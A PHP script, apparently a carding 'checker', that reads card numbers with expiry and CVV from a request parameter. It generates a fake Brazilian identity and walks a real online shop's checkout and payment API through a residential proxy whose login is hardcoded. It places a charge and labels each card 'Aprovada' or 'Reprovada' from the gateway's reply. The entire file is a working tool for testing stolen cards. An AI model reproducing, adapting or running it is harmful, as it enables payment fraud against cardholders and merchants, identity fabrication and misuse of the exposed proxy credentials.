<?php
error_reporting(0);
ignore_user_abort();

####BY WARK FDP
unlink("./cookies.txt");


function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('pal');
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano1 = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];
$data1 = str_replace('20', '', $ano1);


if ($cc[0] == 4){
  $brandcc = "2";
}else if (substr($cc, 0,1) == 5 ){
  $brandcc = "4";
}else if (substr($cc, 0,1) == 6 ){
  $brandcc = "9";
}else if (substr($cc, 0,2) == 60 ){
  $brandcc = "8";
}else if (substr($cc, 0,1) == 3 ){
  $brandcc = "3";
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);
$nome = getStr($dados, '"nome":"','"' , 1);
$cpf = getStr($dados, '"cpf":"','"' , 1);
$celular = getStr($dados, '"celular":"','"' , 1);
$email = getStr($dados, '"email":"','"' , 1);
$senha = getStr($dados, '"senha":"','"' , 1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.libshop.com.br/api/checkout/pub/orderForm?refreshOutdatedData=true");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$dados = curl_exec($ch);
  $order = getStr($dados, '{"orderFormId":"', '"', 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/items');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"orderItems":[{"id":89875,"quantity":1,"seller":"compreja"}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
 $dados = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.libshop.com.br/checkout");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$dados = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/profiles/?email='.$email.'&sc=1');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$dados = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/attachments/clientProfileData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'ontent-type: application/json; charset=UTF-8',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"firstEmail":"'.$email.'","email":"'.$email.'","firstName":"'.$nome.'","lastName":"lonas","document":"'.$cpf.'","phone":"+55 89 98392 8343","documentType":"cpf","isCorporate":false,"stateInscription":"","expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
 $dados = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/attachments/clientPreferencesData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'ontent-type: application/json; charset=UTF-8',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"locale":"pt-BR","optinNewsLetter":false,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$dados = curl_exec($ch);
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/attachments/shippingData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'ontent-type: application/json; charset=UTF-8',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"logisticsInfo":[{"addressId":"504349743'.rand(1000,9999).'","itemIndex":0,"selectedDeliveryChannel":"delivery","selectedSla":"Expressa"}],"clearAddressIfPostalCodeNotFound":false,"selectedAddresses":[{"addressId":"504349743'.rand(1000,9999).'","addressType":"residential","city":"Santa Helena","complement":null,"country":"BRA","geoCoordinates":[-45.2998161315918,-2.2353804111480713],"neighborhood":"barra","number":"33","postalCode":"65208-000","receiverName":"vando campos","reference":null,"state":"MA","street":"barra","addressQuery":"","isDisposable":true},{"addressId":"336233162'.rand(1000,9999).'","addressType":"search","city":"Santa Helena","complement":null,"country":"BRA","geoCoordinates":[-45.2998161315918,-2.2353804111480713],"neighborhood":null,"number":null,"postalCode":"65208-000","receiverName":"vando campos","reference":null,"state":"MA","street":null,"addressQuery":"","isDisposable":null}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$dados = curl_exec($ch);

#'.rand(1000,9999).'
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/attachments/paymentData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'ontent-type: application/json; charset=UTF-8',
'referer: https://www.libshop.com.br/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payments":[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":227891,"bin":"'.substr($cc, 0,8).'","accountId":null,"value":227891,"tokenId":null,"paymentSystem":"'.$brandcc.'","installments":1}],"giftCards":[],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$dados = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/orderForm/'.$order.'/transaction');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"referenceId":"'.$order.'","savePersonalData":true,"optinNewsLetter":false,"value":227891,"referenceValue":227891,"interestValue":0,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
    $pxnonce = curl_exec($ch);

$transactionId = getStr($pxnonce,'"id":"','"', 1);

$orderGroup = getStr($pxnonce,'"orderGroup":"','"', 1);
 #echo "TRANSA: $transactionId GRUOP: $orderGroup<br><br>";
if($transactionId == null){
echo "<span class='text-success'>Reprovada $lista  ➜  [ transactionId não localizado ] ➜ @WarkPy</span><br>";
exit();
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://libshop.vtexpayments.com.br/api/pub/transactions/'.$transactionId.'/payments?orderId='.$orderGroup.'&redirect=false&callbackUrl=https://www.libshop.com.br/checkout/gatewayCallback/'.$orderGroup.'/%2F%7BmessageCode%7D');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'content-type: application/json;charset=UTF-8',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":227891,"bin":"'.substr($cc, 0,8).'","accountId":null,"value":227891,"tokenId":null,"paymentSystem":"'.$brandcc.'","isBillingAddressDifferent":false,"fields":{"holderName":"'.$nome.'","cardNumber":"'.$cc.'","validationCode":"333","dueDate":"'.$mes.'/'.$data1.'","document":"'.$cpf.'","addressId":"504349743'.rand(1000,9999).'","bin":"'.substr($cc, 0,8).'"},"installments":1,"chooseToUseNewCard":true,"id":"COMPREJA-compreja","interestRate":0,"installmentValue":227891,"transaction":{"id":"'.$transactionId.'","merchantName":"COMPREJA"},"installmentsValue":227891,"currencyCode":"BRL","originalPaymentIndex":0,"groupName":"creditCardPaymentGroup"}]');
$dados = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.libshop.com.br/api/checkout/pub/gatewayCallback/'.$orderGroup.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'pr.pyproxy.com:16666');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'warkavtex-zone-resi-region-br:fwc2004os');;
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookies.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'content-type: application/json; charset=UTF-8',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
     $loka = curl_exec($ch);

 if (strpos($loka, '[ECOM - 51]')){
 
 $mm = getStr($loka,'Message:','"', 1);
  echo "<span class='text-success'>Aprovada ➜  $lista ➜ [ R$ -183,20 ] ➜ [ ReturnCode: $mm ] ➜ @Aceleratey </span><br>";
exit();
}
 if (strpos($loka, '[ECOM - N7]')){
 
 $mm = getStr($loka,'Message:','"', 1);
  echo "<span class='text-success'>Aprovada ➜  $lista ➜ [ R$ 183,20 ] ➜ [ ReturnCode: $mm ] ➜ @Acelerate </span><br>";
exit();
}

 if (strpos($loka, '[ECOM - 63]')){
 
 $mm = getStr($loka,'Message:','"', 1);
  echo "<span class='text-success'>Aprovada ➜  $lista ➜ [ R$ 183,20 ] ➜ [ ReturnCode: $mm ] ➜ @Acelerate </span><br>";
exit();
}
else  {
  $mm = getStr($loka,'Message:','"', 1);
  echo "<span class='text-success'>Reprovada ➜  $lista ➜ [ ReturnCode: $mm ] ➜ @Acelerate</span><br>";
 exit();
}



?>